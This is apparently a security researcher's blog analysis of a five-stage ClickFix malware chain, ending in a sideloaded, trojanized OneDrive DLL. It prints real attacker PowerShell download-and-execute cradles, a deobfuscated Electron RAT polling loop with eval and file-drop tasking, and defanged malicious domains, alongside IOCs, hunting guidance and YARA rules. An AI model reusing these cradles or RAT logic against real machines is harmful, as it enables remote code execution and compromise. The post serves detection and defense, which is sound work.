---
title: "A signed OneDrive, a fake note-taking app, and a payload hiding in a PNG: one ClickFix chain, five stages deep"
date: 2026-05-30 09:00:00 +1000
categories: [Malware Analysis]
tags: [clickfix, powershell, electron, javascript, dll-sideloading, signed-binary-abuse, masquerading, application-control, lolbin, c2]
description: "A ClickFix lure drops a 145 MB Electron flomo app. The RAT runs a signed OneDriveLauncher that sideloads a trojanized DLL to decrypt a PNG-wrapped payload."
---

*The views and opinions expressed in this post are my own and do not represent those of my employer. This is a personal blog where I share research and things I'm learning.*

> **TL;DR**
>
> A ClickFix (Win+X -> Terminal lure) drops a PowerShell cradle that pulls a 145 MB "flomo" Electron note-taking app from `devltd[.]top`. The real flomo app is on disk for cover; the malicious code is a graft inside `resources/app.asar`. The Electron RAT polls `finework[.]top/api/` every 30 s and accepts two task types (eval JS or drop-and-exec). The operator drops a folder containing `Con_Adapter.exe` (= a renamed, Microsoft-signed `OneDriveLauncher.exe`) which sideloads a trojanized `LoggingPlatform.dll`. The DLL AES-CBC-decrypts `signal_config.meta`, ciphertext wrapped in 577 PNG IDAT chunks as camouflage. The config filename is smuggled past static analysis as a fake C++ `type_info` RTTI descriptor. Final payload not recovered: the loader derives the AES key at runtime.
>
> **If this is your fleet, do these first:**
>
> - Application Control over user-writable paths is the load-bearing fix - blocks the scripts in `%TEMP%`, the Electron host in `%LOCALAPPDATA%\ExFiles\`, and the sideloaded DLLs at `%TEMP%\<digits>\`.
> - Trust the Authenticode digest match, not the presence of a signature - the trojanized `LoggingPlatform.dll` carries a copied Microsoft signature but the digest fails verification.
> - Hunt `OneDriveLauncher.exe` running outside its real install path, especially with `signal_config.meta` / `volume1024.conf` co-located.
> - Alert on `WindowsTerminal.exe` / `wt.exe` -> `powershell.exe` with download arguments - the Win+X variant of ClickFix that dodges explorer-grandparent detections.
>
> Full IOCs and YARA at the bottom.
{: .prompt-tip }

---

This one started with a single EDR signal - *"PowerShell Execution Via Windows Terminal Lure"* - and a user who'd pasted something they shouldn't have. Five stages later I was staring at a **Microsoft-signed OneDrive binary** loading a **trojanized OneDrive DLL** that was decrypting a payload hidden inside the **IDAT chunks of a PNG**. Every layer was a little more cunning than the last.

I'm going to walk the whole chain, show the real code at each step, and - because that's the point - turn each trick into something you can hunt for or harden against on Monday. Fair warning up front: I got all the way to the final payload's front door and then hit a wall I'll be honest about. Let's dig in.

## The attack at a glance

```text
ClickFix lure (Win+X -> Terminal -> paste)
 -> powershell -W Hidden -Command  (download cradle)            -> clacndjsvulnarbi[.]beer  (gated PHP panel)
   -> runner.ps1                                                -> devltd[.]top/flomotg3.zip
     -> flomo.exe  (trojanized "flomo" Electron app = RAT)      -> polls finework[.]top/api/ every 30s
       -> RAT task drops a folder of files and runs Con_Adapter.exe
         -> Con_Adapter.exe = GENUINE signed Microsoft OneDriveLauncher.exe   (DLL-sideload host)
           -> side-loads TROJANIZED LoggingPlatform.dll  (genuine UpdateRingSettings.dll = decoy dependency)
             -> AES-CBC-decrypts signal_config.meta  (payload wrapped in PNG IDAT chunks)
               -> stage 5  (final payload - not recovered; see the honest bit at the end)
```

## How it works

### Stage 0-2: ClickFix, a cradle, and a runner

The entry point is **ClickFix** - the social-engineering trick where a lure page tells the user to press Win+X, open Terminal, and paste a "fix". The grandparent process here is `WindowsTerminal.exe`, not `explorer.exe`, which is a deliberate dodge of the common ClickFix detections that key on an explorer grandparent.

The pasted command is a tidy hidden download cradle:

```powershell
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
$a1 = Join-Path $env:TEMP ([IO.Path]::GetRandomFileName())   # random temp dir
$b2 = Join-Path $a1 ([IO.Path]::GetRandomFileName()+'.ps1')
Invoke-WebRequest 'hxxps://clacndjsvulnarbi[.]beer/api/index.php?a=dl&...' -OutFile $b2 -UseBasicParsing
Start-Process -WindowStyle Hidden powershell -Args '-ep','Bypass','-File',$b2
```

That `.beer` host is a **gated PHP delivery panel** - it returned `403` to me even with the right PowerShell user-agent, because the one-time tokens in the URL had already been burned by the victim. The downloaded script just writes and runs a `runner.ps1` that pulls the real payload:

```powershell
Invoke-WebRequest 'hxxps://devltd[.]top/flomotg3.zip' -OutFile "$env:TEMP\file.zip"
Expand-Archive "$env:TEMP\file.zip" "$env:LOCALAPPDATA\ExFiles" -Force
Start-Process "$env:LOCALAPPDATA\ExFiles\flomo.exe"
```

### Stage 3: a "flomo" app that's mostly real

`flomotg3.zip` is ~145 MB (payload-bloating to dodge sandbox and AV size limits) and unzips to a complete **Electron application** - the genuine "flomo" note-taking app, Chromium runtime and all. The malicious code is a small graft inside `resources/app.asar` -> `background.js` (the Electron main process, which has full Node/OS access). The web UI is the real flomo, there purely for cover.

Once you strip the `fromCharCode` string obfuscation, the implant is a compact RAT. It registers a bot, then polls a C2 every 30 seconds:

```javascript
const KA = "finework[.]top/api/";
async function poll() {
  const r = await fetch(KA, { method:"POST", headers:{"Content-Type":"application/json"},
            body: JSON.stringify([ botId(), env.COMPUTERNAME, env.USERNAME, ...campaignTag() ]) });
  const ww = await r.json();
  if (ww.task) handle(ww.task);   // (1) eval(task.e)  OR  (2) drop task.files to %TEMP%\<ts>\ and run the .exe
}
```

Two task types: `eval()` arbitrary JavaScript (full RCE), or drop a set of files and execute the dropped `.exe`. In the wild, the operator used door number two.

### Stage 4: bring your own *signed Microsoft* binary

The RAT dropped a folder and ran `Con_Adapter.exe`. Here's the clever part - `Con_Adapter.exe` **isn't malware**. It's a pristine, validly **Authenticode-signed Microsoft `OneDriveLauncher.exe`**, just renamed. The malicious code rides in the DLLs dropped beside it, which the signed EXE loads from its own folder - classic **DLL sideloading**, except the loader is a binary every allowlist and reputation engine waves straight through.

Which of the dropped DLLs is the bad one? Authenticode answers it instantly:

```text
osslsigncode verify Con_Adapter.exe LoggingPlatform.dll UpdateRingSettings.dll
  Con_Adapter.exe        digest MATCH      -> genuine signed OneDriveLauncher.exe (the host)
  UpdateRingSettings.dll digest MATCH      -> genuine Microsoft DLL (a decoy dependency)
  LoggingPlatform.dll    MISMATCH!!!       -> TROJANIZED (signature copied, file patched)
```

Only `LoggingPlatform.dll` fails verification: the attacker kept the real version info and even the stolen signature blob, but patched the code, so the digest no longer matches. That's your malicious file.

### Stage 5: a payload in a PNG, and two slick hiding tricks

`LoggingPlatform.dll` reads a co-dropped file called `signal_config.meta`, decrypts it with **AES-CBC** (via `bcrypt`, reusing OneDrive's own `LogObfuscatorAes` class so the crypto blends in), and runs the result. Two details are worth the price of admission.

**The payload is wrapped in a PNG.** `signal_config.meta` ends with a PNG `IEND` trailer and contains 577 `IDAT` chunks - but the PNG magic and header are mangled, and the concatenated IDAT data doesn't zlib-inflate. It's not an image at all; it's AES ciphertext (entropy 7.97) stuffed inside PNG chunk wrappers for camouflage.

**The payload's filename is hidden as a fake C++ class name.** I went looking for the string `signal_config.meta` in the DLL's code and found... nothing referencing it. No `lea`, no pointer, no xref anywhere - I checked with the decompiler *and* an alignment-independent byte scan. The reason is genuinely sneaky: the string is planted in the RTTI block formatted as a **`type_info` type-descriptor name**:

```text
0x1800a3e58:  [type_info vftable ptr] [spare] ".signal_config.meta"   <- looks like a C++ type descriptor
              ...but the name doesn't start with ".?AV"/".?AU", and Ghidra shows an ORPHANED hierarchy:
              Type Descriptor + Base Class Descriptor + Class Hierarchy Descriptor, but NO vftable,
              NO Complete Object Locator, and ZERO code references.
```

Because RTTI is referenced by structure RVA rather than by a `lea` to the name, the string never shows up in normal string-triage. The loader retrieves it at runtime. It's a tidy way to smuggle a config string past every "grep the strings" reflex we all have.

(Quick aside on tooling: my analysis box is ARM64, and Ghidra ships no aarch64 decompiler, so I built one from source to get through this. That's a story for another post.)

## Techniques observed (MITRE ATT&CK)

| Tactic | Technique | ATT&CK ID | What it did here |
|--------|-----------|-----------|------------------|
| Initial Access / Execution | ClickFix paste-execution | T1204.002 | Win+X->Terminal lure; `WindowsTerminal.exe` grandparent |
| Execution | PowerShell | T1059.001 | hidden cradle + runner |
| Command & Control | Ingress tool transfer | T1105 | `.beer` panel; `devltd[.]top` zip; RAT file drops |
| Execution | JavaScript (Node/Electron) | T1059.007 | RAT `eval()` handler |
| C2 | Web protocols | T1071.001 | `POST finework[.]top/api/`, 30s poll |
| Defense Evasion | Masquerading | T1036.005 | genuine flomo app + signed OneDrive binary |
| Defense Evasion | **DLL side-loading** | **T1574.002** | signed `OneDriveLauncher.exe` loads trojanized `LoggingPlatform.dll` |
| Defense Evasion | Deobfuscate/decode | T1140 | AES-CBC; PNG-IDAT-wrapped payload; RTTI-hidden string |
| Defense Evasion | Subvert trust controls | T1553.002 | attacker code runs inside a Microsoft-signed process |

*ATT&CK IDs are my own mapping from the observed behaviour.*

## Why this matters

This chain is a masterclass in **living off trust**. A signed Microsoft binary, the real flomo app, OneDrive's own crypto class, plain web requests - every component is individually unremarkable, and several are genuinely Microsoft-signed. The malice is in the *combination and placement*, not in any one file. That's precisely the kind of attack that signature- and reputation-based controls miss and that behaviour- and policy-based controls catch. An attacker who gets here has remote code execution, a tasking channel, and a follow-on payload they can swap at will - credential theft, lateral movement, ransomware staging, take your pick.

## What defenders can do

If this were my estate, here's where the effort goes - and the good news is that the same two controls neutralise most of the chain.

| Technique (ATT&CK) | What to do | Essential Eight | What to hunt for |
|--------------------|-----------|-----------------|------------------|
| Cradle/RAT from user paths (T1059.001/.007, T1105) | App-control executables & scripts in user-writable dirs | Application Control (ML1+) | `powershell -File %TEMP%\*`; `node.exe`/`flomo.exe` under `%LOCALAPPDATA%` |
| ClickFix paste (T1204.002) | User-paste-to-terminal awareness; block the lure infra | User Application Hardening | `WindowsTerminal.exe`/`wt.exe` -> `powershell` w/ download args |
| DLL side-loading (T1574.002) | App-control + path/signature validation on DLL loads | Application Control (ML2/3) | signed `OneDriveLauncher.exe` running from `%TEMP%`; `LoggingPlatform.dll` hash != real OneDrive build |
| Signed-binary trust abuse (T1553.002) | Verify Authenticode *digest*, not just "is it signed" | Application Control | a "OneDrive" process whose dir holds `signal_config.meta`/`volume1024.conf` |
| Web C2 (T1071.001) | Default-deny egress; DNS/proxy filtering | No clean E8 home - network architecture | 30s-cadence `POST` to `finework[.]top`; bare-IP/`.beer`/`.top` callbacks |

**Application control is the single highest-value control here, and the whole chain routes through the assumption it removes.** Both the scripts and the sideloaded binaries execute from `%TEMP%` and `%LOCALAPPDATA%` - ordinary user-writable folders, no admin needed. ASD's *Essential Eight Maturity Model* (November 2023) puts this squarely at **Maturity Level One**, which states that *"application control is applied to user profiles and temporary folders used by operating systems, web browsers and email clients"* and *"restricts the execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets to an organisation-approved set."* Note **software libraries** - i.e. DLLs - are explicitly in scope, which is what makes app control bite on sideloading too. See *Implementing Application Control* (Nov 2023). If prevention slips, hunt **Event ID 4688** for `powershell.exe -File` running out of `%TEMP%`, and for a `OneDriveLauncher.exe` executing from anywhere that isn't its real install path.

**"Signed" is not "safe" - verify the digest.** The standout lesson from this sample is that a binary can carry a Microsoft signature and still be the attacker's launcher (because the *signed* file is genuine and only the *sideloaded* DLL is patched). So two concrete actions. First, when triaging, run `osslsigncode verify` (or `Get-AuthenticodeSignature` / `sigcheck`) and trust the **digest match**, not the presence of a signature - the trojanized `LoggingPlatform.dll` shows a clean Microsoft signer but a hash **MISMATCH**. Second, and this is the operational gotcha: **do not blocklist the hash of the genuine host binary** (`OneDriveLauncher.exe`/`Con_Adapter.exe`) - you'll generate noise and break real OneDrive. Detect the *context* instead: a Microsoft-signed loader running from a temp folder, with an off-baseline DLL beside it. This is Application Control territory (Maturity Level 2+ moves toward Microsoft's recommended block rules and publisher-based trust); there's no standalone ASD guide for "verify your signatures", so I'd lean on the Maturity Model and *Implementing Application Control* here.

**Watch for the hiding tricks when you reverse this family.** Two reusable detection ideas for fellow analysts. If your strings-and-grep pass comes up empty on a config you *know* is there, check the **RTTI type descriptors** - a "type name" that doesn't begin with `.?AV`/`.?AU` (here `.signal_config.meta`) is a string smuggled as a fake `type_info`. And a "PNG" whose `IDAT` chunks won't zlib-inflate isn't an image - it's ciphertext in chunk wrappers; carve the IDAT and treat it as an encrypted blob. Neither has an Essential Eight mapping - they're craft notes - but they'll save you the afternoon they cost me.

## Hunting / detection summary

- **Process:** `WindowsTerminal.exe`/`wt.exe` -> `powershell` w/ `Invoke-WebRequest`+`GetRandomFileName`; `flomo.exe` under `%LOCALAPPDATA%\ExFiles` doing periodic `POST`; `OneDriveLauncher.exe` running outside its real install path; `flomo.exe` -> `cmd /c "%TEMP%\<digits>\*.exe"`.
- **Authenticode:** any "Microsoft OneDrive" DLL (`LoggingPlatform.dll`, `UpdateRingSettings.dll`) whose digest fails verification, or whose hash doesn't match a real OneDrive release.
- **Files:** `%LOCALAPPDATA%\ExFiles\`, `%APPDATA%\setup.txt`, `%TEMP%\runner.ps1`, and a folder containing `signal_config.meta` + `volume1024.conf` next to an "OneDrive" exe.
- **Network:** `finework[.]top`, `devltd[.]top`, `clacndjsvulnarbi[.]beer` (-> `178.16.52[.]101`); the `/api/index.php?a=dl&...` panel schema; 30s-cadence POSTs.

## Indicators of Compromise

| Type | Indicator | Notes |
|------|-----------|-------|
| Domain | `clacndjsvulnarbi[.]beer` -> `178.16.52[.]101` | ClickFix delivery panel |
| Domain | `devltd[.]top` | hosts `flomotg3.zip` |
| Domain/C2 | `finework[.]top` (`/api/`, POST, 30s) | Electron RAT C2 |
| SHA256 | `999d411a33a31d7aa64ea72d76e80bd381cdb608de111e3c6e72974c63e42951` | `flomotg3.zip` |
| SHA256 | `7a534b6f952b592b65863cc37d134090dcd5dc77e778521494794ab280325469` | `app.asar` (RAT bundle) |
| SHA256 | `656fb0ce773fdfb745263deb1492170f9b332778a33ee3b15ee0adc33110cff7` | **`LoggingPlatform.dll` - trojanized loader** |
| SHA256 | `d9da1e87d9a5c0003b5243efda6d85e72cfe1d46530560a43eeed152a38a6e67` | `signal_config.meta` (AES-CBC payload in PNG) |
| SHA256 | `df6771aee7f8ffd86b2996e461f5d0ef1762e2aa1c2d979bcea652c9d3c56819` | `Con_Adapter.exe` = **genuine** MS OneDriveLauncher - **do not blocklist** |
| Path | `%LOCALAPPDATA%\ExFiles\flomo.exe`, `%APPDATA%\setup.txt`, `%TEMP%\runner.ps1` | host artifacts |
| Mutex/file | `signal_config.meta`, `volume1024.conf` (in the drop dir) | sideload kit |

## Detection rules

```yara
rule OneDrive_Sideload_TrojanLoggingPlatform {
    meta:
        description = "Trojanized OneDrive LoggingPlatform.dll loader (AES-CBC decrypt of signal_config.meta)"
        author = "Luke Wilkinson"
        date = "2026-05-30"
    strings:
        $meta = ".signal_config.meta" ascii
        $od   = "Microsoft OneDrive" wide
        $pdb  = "LoggingPlatform.pdb" ascii
        $cbc  = "ChainingModeCBC" wide
    condition:
        $meta and ($od or $pdb) and $cbc      // a "OneDrive" DLL referencing the planted payload = trojanized
}

rule ClickFix_flomo_chain_artifacts {
    strings:
        $a = "clacndjsvulnarbi.beer" ascii nocase
        $b = "devltd.top/flomotg3.zip" ascii nocase
        $c = "finework.top" ascii nocase
        $d = "\\ExFiles\\flomo.exe" ascii nocase
        $e = "signal_config.meta" ascii nocase
    condition:
        any of them
}
```

## Closing

The bit I have to be straight about: I didn't crack the final payload. `signal_config.meta` is AES-CBC encrypted with a key the loader derives at runtime in deliberately obfuscated code - no static key to lift, even after building a decompiler and walking the RTTI by hand. The honest finish is a controlled detonation with a breakpoint on `BCryptDecrypt` to grab the plaintext, which is where I'd take it next. Not every analysis ends with the trophy, and pretending otherwise helps no one.

But the chain up to that door is fully mapped, and the lesson is the durable part: **trust is the attack surface now.** Signed binaries, real apps, legitimate crypto, and a payload dressed as a PNG. The two controls that break most of it - application control over user-writable folders, and verifying signature *digests* rather than the mere presence of a signature - are unglamorous and effective. Go check what's allowed to run out of your users' temp folders, and never trust a signature you haven't actually verified. Stay curious.

- Luke

---

*On methodology: the investigation is mine. The reverse engineering and analysis assembly were carried out with AI workflows (Claude, primarily). I reviewed every finding. Errors are mine - ping me on [X](https://twitter.com/btcoolteam) or [Instagram](https://instagram.com/blueteamcoolteam) if you spot something off.*

## References

- MITRE ATT&CK: [T1574.002](https://attack.mitre.org/techniques/T1574/002/), [T1553.002](https://attack.mitre.org/techniques/T1553/002/), [T1204.002](https://attack.mitre.org/techniques/T1204/002/), [T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1059.007](https://attack.mitre.org/techniques/T1059/007/), [T1105](https://attack.mitre.org/techniques/T1105/), [T1071.001](https://attack.mitre.org/techniques/T1071/001/), [T1140](https://attack.mitre.org/techniques/T1140/)
- ASD *Essential Eight Maturity Model* (Nov 2023): https://www.cyber.gov.au/business-government/asds-cyber-security-frameworks/essential-eight/essential-eight-maturity-model
- ASD *Implementing Application Control* (Nov 2023): https://www.cyber.gov.au/business-government/protecting-devices-systems/hardening-systems-applications/system-hardening/implementing-application-control
